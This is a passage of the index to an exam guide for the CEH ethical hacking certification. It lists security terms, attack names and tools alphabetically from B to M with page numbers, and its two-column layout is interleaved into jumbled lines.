See also mobile devices Christmas scan, 107, 109, 112
black-box testing, 36, 488 C++ Worm Generator, 384 Chrome browser, 440
Blackhole Exploit Kit, 375 CA (certificate authority), 416, CIA (confidentiality, integrity,
BlackWidow, 66 425–427, 431–432 and availability), 19–22
Bleeding Life, 375 CaaS (Container as a Service), 348 cipher block chaining message
blind/inferential injection, 269 CAC (Common Access Card), 425 authentication code
block ciphers, 411, 412, 413–414 cache (CBC-MAC), 287
blockchain, 417–418 ARP, 149–151 Cipher Block Chaining Message
Bloover, 317 DNS, 71–73, 78 Authentication Code Protocol
Blowfish encryption, 414 Google Cache, 66 (CCMP), 287
blue team, 489 web cache poisoning, 252–253 cipher text, 410
Blueborne attack, 327 Cain and Abel tool ciphers, 411–414
Bluebugging, 316, 317 ARP flooding, 159 cipher-text-only attacks, 442
Bluejacking, 316 MAC address spoofing, 159 CIRT tools, 215
Blueprinting, 317 sniffing passwords, 212–213, Cisco, 293
BlueScanner, 317 215, 296 Cisco routers, 159
Bluesmacking, 316 WEP attacks, 296 Clair scanner, 360
Bluesnarfing, 317 caller ID, 76 clickjacking, 373–374
Bluesniffing, 316, 317 CAM (content addressable memory) clients, 280, 282, 284, 285
Bluetooth attacks/hacking, 316–317 table, 158 Cline, Ernest, 63
Bluetooth devices, 315, 316–317 Camellia encryption, 414 closed loop systems, 333
Bluetooth technology, 281, 315 canaries, 259–260 cloud auditors, 351
Bluetooth tools, 317 canary words, 259–260 cloud brokers, 351
bondat worm, 384 cantennas, 283 cloud carriers, 350
boot loader–level rootkits, 225 CANVAS, 491 cloud computing, 343–369
boot-n-root attack, 434 Capsa Network Analyzer, 165 architecture, 350–351
BootROM exploit, 312 CAPTCHA, 62–63, 262 attacks, 359
Border Gateway Protocol (BGP), 246 Carnivore, 443 considerations, 488
botnet Trojans, 375 Carrier Sense Multiple Access/ data breach/loss, 356
botnets, 16, 269, 392, 468 Collision Detection (CSMA/CD), growth of, 345
BPCS (basic process control 145–147 horror stories, 352–353

system), 334 cars. See vehicles IoT and, 320, 321

17-Index.indd 565 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

CEH Certified Ethical Hacker All-in-One Exam Guide

566

cloud computing (cont.) Common Access Card (CAC), 425 copyrights, 40–41
mitigations, 359 Common Criteria (CC), 23, 24 Core Impact Pro, 490–491
overview, 344–346 Common Vulnerabilities and core testing, 491–492
OWASP top 10 risks, 354–355 Exposures (CVE) system, 13 corrective controls, 18
regulatory efforts, 351 Common Vulnerability Scoring covert channels, 374
roles in, 350–351 System (CVSS), 13 COVID-19, 345
security, 352–363 Common Weakness Enumeration crackers, 27, 34
terminology, 348–349 (CWE), 13 cracking passwords.
threats, 354–358 Communication Act of 1934, 294 See password cracking
tools, 355–356 Communications Decency Act, 41 Crimepack, 375

cloud consumers, 350 community cloud model, 349 criminal activity, 53
Cloud Container Attack Tool community strings, 128–129 CRITIFENCE, 334

(CCAT), 361 companies CRL (certificate revocation list), 425
cloud containers, 348–349 antivirus, 240 cross-certification, 427
cloud control layers, 354 BYOD and, 307, 310, 313–314 cross-guest VM breach, 359
cloud, defined, 343, 344 competitive intelligence, crossover error rate (CER), 207,
cloud deployment models, 347, 55–56, 83 475–476

349–351 financial information, 55, 56 cross-site request forgery (CSRF), 261
cloud hacking, 360–363 trustworthiness of, 432 cross-site scripting (XSS), 238
cloud hopper attack, 359 competitive intelligence, 55–56, 83 cryptanalysis, 410, 411
cloud providers, 346, 350 compliance, 39, 40 crypters, 374
Cloud Security Alliance (CSA), Computer Fraud and Abuse Act, 59 CryptoBench, 443

351, 356 computers CryptoDefense virus, 383
cloud services contaminants, 473 cryptographic systems, 411

Amazon. See AWS entries laptop, 434 cryptography, 409–451.
deployment models, 347, 349–351 social engineering attacks, See also encryption
enumeration, 360 462–468 algorithms/techniques, 411–424
hacking, 360–363 zombie, 392 digital certificates, 426–432
MEGA cloud service, 268 Computerworld, 12 digital signatures, 416, 432–433

cloud vendors, 348 confidentiality, 19–20, 411, 435 encrypted communication,
cloudbourne attack, 359 confidentiality, integrity, and 433–441
Cloudflare, 245–246 availability (CIA), 19–22 history, 409–411
CloudGoat, 360 CONNECT method, 249 mobile devices, 308
CloudInspect, 355 connection string parameter overview, 410–424
CloudPassage Halo, 355 pollution (CSPP), 253 PKI system, 424–433
CloudTrail, 361 connectionless communication, 91 terminology, 410–411
CNAME records, 70 connectionless scanning, 108–109 cryptography attacks, 441–443
CNM (Container Network connection-oriented communication, CryptoLocker virus, 383

Model), 349 91–94 CrypTool, 412, 443
COBIT (Control Objectives Container as a Service (CaaS), 348 CryptorBit virus, 383

for Information and Related Container Network Model CSA (Cloud Security Alliance),
Technologies), 40 (CNM), 349 351, 356

code/coding containers, 348–349, 360 CSMA/CD (Carrier Sense Multiple
dot-dot-slash attack, 250–252 content addressable memory (CAM) Access/Collision Detection),
executable code, 218–219 table, 158 145–147
HTML code, 66, 243, 247, 252 Contiki OS, 319 CSPP (connection string parameter
malicious code, 373 Control Objectives for Information pollution), 253
rolling code attack, 327 and Related Technologies CSRF (cross-site request forgery), 261
shrink-wrap code attacks, 28 (COBIT), 40 cultureresource.exe file, 390
source code, 252 cookies Currports tool, 96, 378, 389
Stuxnet code, 385 application attacks and, 260, CVE (Common Vulnerabilities and
Unicode, 175, 251, 252 261–262 Exposures) system, 13
vulnerabilities, 14, 308–309 considerations, 66 CVSS (Common Vulnerability

Codenomicon, 439 Google, 119 Scoring System), 13
collision attacks, 419, 422 overview, 261–262 CWE (Common Weakness
collision domains, 145–147, 156 passive online attacks and, 213 Enumeration), 13
collisions, 145–147, 419 passwords stored in, 262 Cyber Kill Chain methodology,
command injection, 258 SCTP COOKIE scans, 110 32–34
command shell Trojan, 375 XSS and, 260 Cyber Observer, 268

17-Index.indd 566 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

Index

567

cyberattacks, 20–21 default passwords, 14, 28, 209, DNS records, 54, 68–71
cybercitizen, 390 215, 334 DNS servers, 68–78, 292, 326
cybercrime, 268 defense in depth, 289, 477 DNS services, 326
cyberterrorists, 27 DELETE method, 249 DNS zone transfers, 70–72, 77, 78
CypherX, 374 demilitarized zone (DMZ), 11–12, DNSSEC (Domain Name System

173, 331, 333 Security Extensions), 71–72, 75

D denial-of-service (DoS) attacks, 22, Docker, 349
293, 294, 391–395 Docker Engine, 349

DAC (discretionary access control), 24 DEP (data execution prevention), 260 docker swarm, 349
Dadga scanner, 360 Department of Defense (DoD), DoD (Department of Defense),
DAI (Dynamic ARP Inspection), 159 22, 167 22, 167
daisy-chaining networks, 16 DES (Data Encryption Standard), 413 domain controller, 193
DameWare Remote Support, 219 DES authentication, 191 Domain Name System. See DNS
DAR (data at rest), 433–434, 435 deserialization flaws, 238, 239 Domain Name System Security
Dark Reading, 12 design flaws, 14 Extensions (DNSSEC), 71–72, 75
DAST (Dynamic Application detective controls, 18 domain names, 74

Security Testing), 238 Dharma virus, 383 DoS (denial-of-service) attacks, 22,
data DHCP (Dynamic Host 293, 294, 391–395

availability, 22 Configuration Protocol), 159–160 dot-dot-slash attack, 250–252
backups, 18, 210 dictionary attacks, 214–216 downloader, 373
considerations, 6–7 Diffie-Hellman algorithm, 398, 416 doxing, 16
described, 6 dig command, 78 Dragonfly Key Exchange, 285
disclosure, 19 digital certificates, 426–432 DRDoS (distributed reflection
encrypted. See encryption Digital Signature Algorithm denial-of-service) attack, 392
gathering. See information (DSA), 433 drive-by downloads, 373

gathering digital signatures, 416, 432–433 drivers, 291
handling of, 25 digital watermarks, 422 dropper, 373
PDU, 6, 7 directory climbing, 251–252 DROWN (Decrypting RSA
at rest, 433–434, 435 Directory System Agent (DSA), 130 with Obsolete and Weakened
sensitive, 71, 238 directory traversal, 250–252 eNcryption), 441
storage, 308, 319 direct-sequence spread spectrum DRP (disaster recovery plan), 18
transfer/exchange, 91–93 (DSSS), 281 DSA (Digital Signature

data at rest (DAR), 433–434, 435 disaster recovery plan (DRP), 18 Algorithm), 433
data breaches, 20–21 disasters, 18, 477 DSA (Directory System Agent), 130
data breach/loss, 356 discovery, 290–292 dsniff tool, 159
data centers, 345 discovery mode, 315 DSSS (direct-sequence spread
Data Encryption Standard. See DES discretionary access control (DAC), 24 spectrum), 281
data execution prevention disgruntled employees, 59–60, DUHK attack, 419

(DEP), 260 460–462 dumpster diving, 54, 55, 57, 209, 456
data layers, 6 distributed control system (DCS), DumpsterDiver, 361
data leaks, 268 333–334 dust, 473
Data Link layer, 6, 7, 144, 148 distributed reflection denial-of- DYLIB hijacking, 217
database servers, 243 service (DRDoS) attack, 392 Dyn attack, 269, 326
databases, 191, 195, 263–267 distributed-denial-of-service attacks. Dynamic Application Security
datagrams, 10, 91 See DDoS attacks Testing (DAST), 238
D&B Hoovers, 55 DLL hijacking, 217 Dynamic ARP Inspection (DAI), 159
DCS (distributed control system), DMZ (demilitarized zone), 11–12, Dynamic Host Configuration

333–334 173, 331, 333 Protocol (DHCP), 159–160
DDoS attacks, 269, 326, DNS (Domain Name System) dynamic web pages, 257

392–394, 395 basics, 68–78
debug tools, 334–335 cache, 71, 72, 78
Decrypting RSA with Obsolete E

considerations, 9, 10
and Weakened eNcryption for footprinting, 67–78 EAL (Evaluation Assurance Level), 23
(DROWN), 441 tools for, 68–78 EAP (Extensible Authentication

decryption, 286, 410, 412–416. DNS amplification, 250 Protocol), 287
See also encryption DNS attacks, 69–72, 76, 77 Easter eggs, 63–64

decryption keys. See private keys DNS lookups, 70–71, 72 eavesdropping, 143, 144, 457.
defacement Trojans, 375 DNS namespace, 68–72, 75, 77 See also sniffing
default installations, 14 DNS poisoning, 71, 72, 78, 161 e-banking Trojans, 375

17-Index.indd 567 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

CEH Certified Ethical Hacker All-in-One Exam Guide

568

ECC (Elliptic Curve GOST, 414 hacking phases, 29–32
Cryptosystem), 416 hardware, 423–424 laws/standards, 37–42

EC-Council, 4, 17, 24, 25, 52, 241 hash algorithms, 416–422 overview, 25–26
eCh0raix virus, 383 homomorphic, 424 terminology, 16, 26–34
Echo Request, 104 IDEA, 414 white hats, 26
EDGAR database, 55 IoT devices, 321 Ettercap sniffer, 165, 213, 397
edge computing networks, 345–346 key, 411–416 Euromonitor, 55
Edge Technology Layer, 320 laptops, 434 Evaluation Assurance Level
EF (exposure factor), 18 Magma, 414 (EAL), 23
Effland, Charlie, 357 mobile devices, 434 evasion, 165–180
EFS (Encrypting File System), overview, 410–424 firewalls, 172–177

435–436 PKI system, 427 honeypots and, 178–180
EISA (Enterprise Information quasi-encryption, 424 IDS evasion, 102, 166, 167,

Security Architecture), 17 RC, 414 174–175
El Gamal algorithm, 416 Serpent, 414 intrusion detection systems.
EliteWrap, 374 shared key, 413–415 See IDSs
Elliptic Curve Cryptosystem single key, 413–415 IP address decoy, 117

(ECC), 416 steganography, 422–423 mobile platform, 118–119
e-mail symmetric, 413–415, 434 overview, 165–166, 174

contact, 72 techniques, 411–424 proxies, 117–119
executable code in, 218 terminology, 410–411 source routing, 117
footprinting, 66–67 Twofish, 414 spoofing IP addresses, 116–117
malware and, 374 USB, 424 techniques, 174–180
phishing, 210, 463–468 wireless networks, 285–289, tools for, 116–119
S/MIME and, 437 295–297 via anonymizers, 119
spam, 179, 374 encryption devices, 423–424 via fragmentation, 116, 133, 175
tracking tools, 66–67 encryption keys. See public keys via TOR, 118

e-mail headers, 67, 68 Endpoint Encryption, 434 event logs, 222–223, 224
e-mail indicators, 34, 35 Engineer’s Toolset, 129 evil twin attack, 292
e-mail policy, 25 Enterprise Information Security exam, 3–5
e-mail servers, 77 Architecture (EISA), 17 exam tips, 4–5
Emotet, 390 Enterprise Zone (IT), 333 exclusive-or. See XOR
employees enumeration, 121–131 executable code, 218–219

disgruntled, 59–60, 460–462 banner grabbing, 125–126 Experian, 55
privilege escalation and, 36 cloud services, 360 Exploit Database, 12
security policies, 24 considerations, 121 exploit kits, 375
social engineering and, 456–462 described, 121 exploits, 16, 373

Encapsulating Security Payload examples of, 30 EXPN command, 131
(ESP), 398, 436 Linux systems, 123–124 exposure factor (EF), 18

encrypted communication, 433–443 NetBIOS, 126–128 extended service set (ESS), 282
Encrypting File System (EFS), other options, 130–131 Extensible Authentication Protocol

435–436 SNMP, 128–130 (EAP), 287
encryption. See also cryptography techniques, 124–131 Extensible Markup Language (XML),

3DES, 414 Unix systems, 123–124 114, 248
AES, 414 Windows systems, 121–123 external assessment, 488
algorithms, 411–424, 440 e-passports, 208
asymmetric, 415–416 escalation of privileges, 31, 36, F
Blowfish, 414 216–218
Camellia, 414 ESP (Encapsulating Security FAA (Federal Aviation
cipher types, 411–414 Payload), 398, 436 Administration), 294
data at rest, 433–434, 435 ESS (extended service set), 282 FaaS (Function as a Service), 348
data while communicating, Eternal Blue exploit, 383 Facebook, 56, 59, 462–463

433–443 Ethereal. See Wireshark sniffer Factoring Attack on RSA-EXPORT
decryption, 286, 410, 413, Ethernet frames, 9–11 Keys (FREAK), 439

415, 416 ethical hackers, 19, 27, 34–42 fake anti-malware programs, 380
DES, 413 ethical hacking, 25–42. Faletra, Lorenzo, 205
digital certificates, 426–432 See also hacking false acceptance rate (FAR), 207,
digital signatures, 432–433 attack types, 28 475–476
Endpoint Encryption, 434 classifications, 26–27 false negatives, 166
evading AV with, 375 considerations, 113 false positives, 166, 174

17-Index.indd 568 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

Index

569

false rejection rate (FRR), 207, Firmalyzer, 330 Gizmodo, 330
475–476 firmware, 225, 321, 323 global scope, 152, 153

FAR (false acceptance rate), 207, firmware rootkits, 225 GNU Wget, 66
475–476 flags, 106–109 Google

fault injection attack, 327 flash memory, 423 Chrome browser, 440
FCC (Federal Communications flooding, 174 cookies, 119

Commission), 294, 295 flow control, 6 growth of, 345
FDE (full disk encryption), 434 footprinting, 52–83 Heartbleed exploit, 438, 439
Federal Aviation Administration active, 53–54, 56–57 IoT hacking and, 327–328

(FAA), 294 anonymous, 53 OpenSSL and, 438
Federal Communications benefits of, 53 Google Cache, 66

Commission (FCC), 294, 295 considerations, 52, 54, Google CAPTCHA, 62–63
Federal Risk and Authorization 58–59 Google hacking, 60–64, 360

Management Program DNS, 67–78 Google search engine, 60–64
(FedRAMP), 351 dumpster diving, 54, 55, Google search queries, 63–64

FedRAMP (Federal Risk and 57, 456 Google servers, 440
Authorization Management e-mail, 66–67 GOST encryption, 414
Program), 351 methods/tools, 57–83 government access to keys (GAK), 421

Feistel cipher, 414 network, 79–81 GPS devices, 290, 291
Ferret tool, 213 overview, 52–54 gray hats, 27
file extensions, 375 passive, 53–56 gray-box testing, 36, 488
file injection, 258 pseudonymous, 53 Grayfish rootkit, 225
file streaming, 220–221, 222 vs. reconnaissance, 52 the Great Firewall, 119
file system, 199, 220–221, 435–436 vs. scanning, 90 “greppable” format, 114
File Transfer Protocol (FTP), 148, 436 search engines, 57–66 group IDs (GIDs), 124
fileless malware, 385–386 social engineering and, 54, 56 GuardDuty, 361
files web mirroring, 66 Guardster, 119

activity, 219–224 web servers, 241–242 guidelines, 25
game, 374 web spiders, 58–59, 82 Gzapper, 119
hiding, 220–224 website, 66–67
hosts, 73 fraggle attacks, 393 H
HTML, 247, 250 fragmentation, 107, 116, 133, 175
image, 422–423 fragmentation attacks, 392 hack value, 15
log. See log files fragmented packets, 94, 116–117, 392 hackers. See also pen testers
SAM, 191–195 frames, 6, 7, 10, 11, 90 adversary behavioral
shadow, 200, 202 FREAK (Factoring Attack on identification, 32
signature, 390 RSA-EXPORT Keys), 439 Anonymous, 394
steganographic, 422–423 FRR (false rejection rate), 207, black hats, 27
zone, 72 475–476 classifications, 26–27

filters, 162–164 FTP (File Transfer Protocol), considerations, 31, 34
FIN flag, 92 148, 436 crackers, 27, 34
FIN scans, 106 fud (fully undetectable), 374 Cyber Kill Chain, 32–34
financial information, 55, 56 full connect scan, 106, 109 described, 25
Fing, 115 full disk encryption (FDE), 434 ethical. See ethical hackers
finger tool, 124 full open scan, 106 favorite tools, 64
fingerprinting, 102, 113, 116 Function as a Service (FaaS), 348 good vs. bad, 34
Firefox, 440 functionality, 15, 16 gray hats, 27
Firewalk tool, 175 fuzz testing, 265 honeypots, 178–180
firewalking, 175, 177 IDS evasion, 102, 166, 167,
firewalls 174–180

G
application-level, 173 indicators of compromise, 34
banner grabbing and, 175 GAK (government access to keys), 421 interview with, 167–168
bastion hosts, 173 game files, 374 malicious, 34
circuit-level, 173 games, video, 269 vs. pen testers, 31
evasion, 172–177 Gartner, 331, 332 phreakers, 26
hacking tools, 175–177 GDB tool, 334–335 profiling, 32–34
implicit deny principle, 172 GET method, 248, 249 script kiddies, 26, 27
multi-homed, 173 GFI LanGuard, 15, 121 state-sponsored, 27
overview, 172–174 GIDs (group IDs), 124 suicide hackers, 27
packet-filtering, 173 Gilisoft Full Disk Encryption, 434 tips on, 168
rules, 172 GitHub, 360, 361 white hats, 26

17-Index.indd 569 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

CEH Certified Ethical Hacker All-in-One Exam Guide

570

Hackerstorm, 12 heap overflow, 259 hybrid attacks, 214
hacking, 206–226. See also pen testing Heartbleed exploit, 437–439, 440 hybrid cloud model, 349

AWS and, 268–269, 358, HEUMF (Highly Enriched Uranium Hyena, 128
360–362 Materials Facility), 472 hyperlinks, 237

Bluetooth, 316–317 hex editor, 375 hypertext, 247
cloud services, 360–363 HFS file system, 220 Hypertext Transfer Protocol.
Computer Fraud and Abuse hidden field, 252 See HTTP

Act, 59 hiding files, 218–219 hypervisor-level rootkits, 225
considerations, 25–26, 27, 42 HIDS (host-based IDS), 104–105, hypervisors, 346, 353
covering/clearing tracks, 31, 204, 166–167

219, 222–224 hierarchical trust system, 427 I
ethical. See ethical hacking Highly Enriched Uranium Materials
fingerprints, 33–34 Facility (HEUMF), 472 IaaS (Infrastructure as a Service), 346
gaining access, 30, 205 hijacking sessions, 395–399 IAM (identity and access
good vs. bad, 25–27 HIPAA (Health Insurance Portability management), 348
Google hacking, 60–64, 360 and Accountability Act), 39 IANA (Internet Assigned Number
IoT devices, 327–331 Hoare, Greg, 358 Authority), 74, 95
learning about, 240 homomorphic encryption, 424 iBoot exploit, 312
Linux. See Linux systems The Honeynet Project, 179, 268 ICANN (Internet Corporation for
“low-hanging fruit,” 443 honeypots, 178–180, 239, 268 Assigned Names and Numbers), 74
maintaining access, 30–31, 205 honeyspot attacks, 293 ICMP (Internet Control Message
mobile devices, 307, 310, Horsepill rootkit, 224–225 Protocol), 103–105

315–317 Host Based Security System ICMP Echo scanning, 104
OT hacking, 331–335 (HBSS), 167 ICMP floods, 393
vs. pen testing, 57 host ID, 99 ICMP message types, 103–105
phases of, 29–32, 203–205 host-based IDS (HIDS), 104–105, ICMP packets, 104, 105, 393
privilege escalation, 31, 36, 166–167 ICMP requests, 80, 81

216–218 host-based indicators, 34, 35 ICQ (Internet Chat Query), 392
reconnaissance. See reconnaissance hosts file, 73 ICS (industrial control systems),
system. See system attacks hotspots, 293 333–334, 335
terminology, 16, 26–34 Hping, 114–115 ICV (integrity check value), 286
Unix systems. See Unix systems Hping3, 115 ID badges, 457
web-based. See web-based hacking HSM (hardware security module), 424 ID Serve, 241
Windows. See Windows systems Hsu, Jeremy, 345 IDA Pro, 335
wireless. See wireless hacking HTML code, 66, 243, 247, 252 IDaaS (Identity as a Service), 348

HackRF One, 327 HTML entities, 248, 260 IDEA (International Data
“hacktivism,” 27 HTML files, 247, 250 Encryption Algorithm), 414
half-open scan, 106 HTTP (Hypertext Transfer identity and access management
halo effect, 458 Protocol), 148, 247–249 (IAM), 348
Halo platform, 355 HTTP attacks, 267 Identity as a Service (IDaaS), 348
hardware encryption, 423–424 HTTP beacons, 174 identity theft, 457–458, 470–471
hardware protocol analyzers, 147 HTTP requests, 9, 247–249, 250 IDLE scan, 107–109
hardware rootkits, 225 HTTP response messages, 249 IDMZ (Industrial Demilitarized
hardware security module (HSM), 424 HTTP response splitting, 267 Zone), 333
hash algorithms, 191, 416–422 HTTP shell, 174 IDSInformer tool, 175
Hash Droid, 422 HTTP tunneling, 174 IDSs (intrusion detection systems),
hash injection attacks, 209 httpd.conf file, 247 165–172
hash values, 21–22, 191–193 HTTPRecon, 241 anomaly-based, 166
HashCalc, 422 httprint, 241 behavior-based, 19, 166
hashes, 21–22, 475, 476 HTTPS, 247 evasion, 102, 166, 167,
hashing passwords, 191–195 HTTPS servers, 441 174–175
HashMyFiles, 422 HTTrack, 66 host-based, 104–105, 166–167
Havij scanner, 267 hubs, 147, 156, 157, 286 network-based, 104–105, 167
HBSS (Host Based Security human-based social engineering, overview, 166–167

System), 167 456–462 signature-based, 166
HEAD method, 248 humidity, 473 Snort, 167–172
headers, 66 Hunt tool, 397 Unicode characters and, 175
Health Insurance Portability and Hutchins, Marcus, 384 IEFT (Internet Engineering Task

Accountability Act (HIPAA), 39 HVAC attacks, 327 Force), 236

17-Index.indd 570 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

Index

571

IIOT (Industrial Internet of International Telecommunications IoT devices
Things), 333 Union (ITU), 289, 320 attacks on, 306, 320–327

IIS (Internet Information Services) Internet Assigned Number Authority baby monitors, 326
servers, 243, 244, 245 (IANA), 74, 95 hacking, 327–331

IKE (Internet Key Exchange), 398 Internet Chat Query (ICQ), 392 overview, 317–318
image files, 422–423 Internet Corporation for Assigned requirements for, 318–319
IMAP (Internet Message Access Names and Numbers (ICANN), 74 securing, 331

Protocol), 148 Internet DMZ zone, 11 thermostats, 317, 318, 319
impersonation, 456–457 Internet Engineering Task Force vulnerabilities, 306, 320–327
implicit deny principle, 172 (IEFT), 236 IoT gateway, 319
in-band SQL injection, 266–269 Internet Information Services (IIS) IoT Inspector, 329
incident management, 16 servers, 243, 244, 245 IoT networks, 318–326
incident response team (IRT), 16 Internet Key Exchange (IKE), 398 IoT operating systems, 318–319
indemnity forms, 487–488 Internet Layer, 320 IoTsploit, 329
indicator of compromise (IOC), 34 Internet Message Access Protocol IP (Internet Protocol), 148
industrial control systems (ICS), (IMAP), 148 IP Address Decoy, 117

333–334, 335 Internet of Things. See IoT entries IP addresses
Industrial Demilitarized Zone The Internet of Useless Things, 330 broadcast, 98, 100

(IDMZ), 333 Internet Protocol. See IP described, 98
Industrial Internet of Things Internet Protocol Security (IPsec), DNS and, 9, 10, 74

(IIOT), 333 436–437 fragmented, 107
Infinity, 375 Internet Relay Chat (IRC), 392, 468 multicast, 98
information. See data Internet Security Association Key network range, 79–80
information audit policy, 25 Management Protocol, 398 rules, 99
information gathering, 51–88 Internet service providers (ISPs), spoofing, 107, 116–117

company websites, 55–56 41, 395 unicast, 98
competitive intelligence, Internet Society, 239 IP communication, 398

55–56, 83 Internet zone, 11 IP identifier (IPID), 107
dumpster diving, 54, 55, 57, intranet zone, 12 IP packet header, 148

209, 456 intrusion detection systems. See IDSs IP packets, 9–10, 107
job boards, 58 Inundator tool, 175 IP Scanner, 115
shredded documents, 456 inverse TCP flag, 106 IP version 4. See IPv4
social networking sites, 56, inverse TCP scan, 109 IP version 6 (IPv6), 151–153

59–60 IOC (indicator of compromise), 34 iPhones. See also mobile devices
web-based hacking, 241–242 iOS, 307, 311–313. applications, 308, 311, 313, 314

information protection policy, 25 See also mobile devices iOS, 307, 311–313
information security policy, 24 IoT (Internet of Things), 317–331 jailbreaking, 307, 311–315
infowar, 28 architecture, 318–320 IPID (IP identifier), 107
Infrastructure as a Service (IaaS), 346 authorization/authentication, iPods, 311
infrastructure mode, 281–282 321, 331 IPsec (Internet Protocol Security),
initial sequence number (ISN), communication models, 319, 320 398, 436–437

396, 397 considerations, 317, 318, 320, 330 IPSec shell, 398
initialization vector (IV), 286 data storage, 319 IPv4 (IP version 4), 151–153
injection attacks, 253, 257–259, 327 device management, 321 IPv4 addresses, 98
injection flaws, 237 encryption, 321 IPv4 loopback address, 144
injector, 373 hacking methodology, 327–331 IPv6 (IP version 6), 151–153
insider threats, 460–462 HVAC attacks, 327 Iran nuclear worm, 385
installation vulnerabilities, 14 insecure communication, 308, 321 IRC (Internet Relay Chat),
Instant-On Cloud Security, 356 overview, 305–306, 317–318 392, 468
Institute for Security and Open passwords and, 321 IRDP spoofing, 161

Methodologies (ISECOM), 239 physical hardening and, 321 IRT (incident response team), 16
integrity, 21–22, 321 privacy issues, 321 ISECOM (Institute for Security and
integrity check value (ICV), 286 security issues, 320–327, 331 Open Methodologies), 239
Integrity RTOS, 319 software/firmware issues, ISeePassword tool, 212
Intelligence Driven Defense 321, 323 ISN (initial sequence number),

model, 32 update mechanism, 321 396, 397
interference attacks, 442 vehicles, 319, 327 ISO/IEC, 39
internal assessment, 488 vulnerabilities/attacks, 306, ISPs (Internet service providers),
International Data Encryption 320–327 41, 395

Algorithm (IDEA), 414 vulnerability scanning, 329–330 IT (Enterprise Zone), 333

17-Index.indd 571 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

CEH Certified Ethical Hacker All-in-One Exam Guide

572

ITU (International Lambda, 361 LOIC (Low Orbit Ion Cannon), 394
Telecommunications Union), LAN Manager, 191 LoJax rootkit, 225
289, 320 LANforge Fire, 93 Long, Johnny, 60–61

IV (initialization vector), 286 laptop computers, 434 lovebugs, 57
Latin America and Caribbean Low Orbit Ion Cannon (LOIC), 394

J Network Information Center “low-hanging fruit,” 443
(LACNIC), 74, 75 LTE networks, 294

jailbreaking, 307, 311–315 lawful interception, 153
jamming devices, 293–295 laws/standards, 37–42
Java, 467 M

layered security, 477
JavaScript, 260 LDAP (Lightweight Directory Access MAC (mandatory access control), 24
Jipher, 443 Protocol), 130 MAC (Media Access Control),
job boards, 58 LDAP Admin Tool, 130 144–145
John the Ripper, 215, 443 LDAP injection attacks, MAC addresses
JPS Virus Maker, 380 257–259 ARP and, 148–150
JTAGulator, 330 LEX tool, 130 broadcast messages, 144–145
JXplorer, 130 LexisNexis, 55 considerations, 9, 10

libpcap, 145 filtering, 295

K library-level rootkits, 225 flooding, 157–158
libwhisker, 166 multicast messages, 145

Kaminsky, Dan, 71
Licklider, J.C.R., 344 spoofing, 158, 160–161, 295

KDC (key distribution center), 193
Lightweight Directory Access WPA and, 287

KerbCrack, 213
Protocol. See LDAP MAC duplication, 161

Kerberos authentication, 191–195
link local scope, 152, 153 MAC filtering, 295

kernel-level rootkits, 225
LinkedIn, 58, 59, 462 macOS systems, 123

key distribution, 413–415, 416
Linux root, 199–202 MadWifi project, 291

key distribution center (KDC), 193
Linux servers, 198 Magic Lantern, 443

key encryption, 411–416
Linux systems Magma encryption, 414

key escrow, 421
basic commands, 200, 201 malicious applications, 468–469

key generation, 424
basics, 123–124 malicious code, 373

key pairs, 413, 415, 425
considerations, 123 Maltego tool, 82

Key Reinstallation Attack (KRACK),
enumeration, 123–124 malvertising, 373

296–297
file structure, 199–200 malware

key sets, 424
file system, 199 defined, 372

keyboard walks, 208
footprinting and, 81 distribution of, 373–374

keyloggers, 210
hacking, 201–204 fake anti-malware programs, 380

keys
navigating, 200 fileless, 385–386

government access to, 420–421
password cracking, 212, 215 installation of, 373–374

length, 413, 414, 439
passwords, 200, 201, 212 malicious applications,

private. See private keys
security, 193–203 468–469

public. See public keys
users/groups, 124 mobile banking, 268

registry, 195–197
list scans, 104 non-malware, 385–386

shared, 284, 285
“live” systems, 102 transmit, 374

symmetric encryption, 413–415
LLMNR attacks, 210–211 types of, 373

temporal, 296
Lloyd, Kris, 358 via e-mail, 374

WEP, 286
LM authentication, 191, 192 malware attacks, 372–390

WPA2, 297
LM hashing, 191, 192 anti-malware/antivirus programs,

keystream, 286
locks, 472, 474, 476, 478 372–375

KillerBee, 330
log files overview, 372–373

KisMAC, 289, 296
application logs, 223 Sunburst malware, 129–130

Kismet, 291–292, 297
considerations, 31, 223 Trojans, 375–379

known plain-text attacks, 441
corrupted, 31, 223 viruses, 379–385

KRACK (Key Reinstallation Attack),
covering/clearing tracks, 204, worms, 379–385

296–297
219, 222–224 malware authors, 240

Kubernetes, 360
deleting, 31, 223 Malwarebytes, 379
event logs, 222–223, 224 MalwareTech, 384

L location of, 223 Management Information Base.
See MIB

L0phtcrack, 443 monitoring, 223

LACNIC (Latin America and security logs, 223 management network zone, 12
mandatory access control (MAC), 24

Caribbean Network Information system logs, 223

Center), 74, 75 web-based hacking, 239 man-in-the-cloud (MITC) attack, 359

17-Index.indd 572 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

Index

573

man-in-the-middle (MITM) attacks, mobile banking malware, 268 N
212, 327, 396, 442 mobile computing, 306–317

mantraps, 476–477 application-based attacks, name lookups, 72
manual systems, 333 468–469 name resolvers, 71
Manufacturing Zone (OT), 333 attacks, 307, 310, 311–317 name servers, 70–71, 74, 78
Market Watch, 55 authentication, 308 namespace, 68–72, 75, 77
masking, 422 authorization, 309 NAT (network address translation),
The Matrix, 305 backdoors, 309 172–173, 398
Matsui, Mitsuru, 411 code-level issues, 309 National Computer Security Center
maximum tolerable downtime considerations, 280, 306 (NCSC), 22–23

(MTD), 18 data storage, 308 National Cybersecurity FFRDC, 13
MBSA (Microsoft Baseline Security insecure communication, National Institutes of Standards and

Analyzer), 120, 270 308, 321 Technology. See NIST
MD4 algorithm, 191 overview, 306 National Security Agency. See NSA
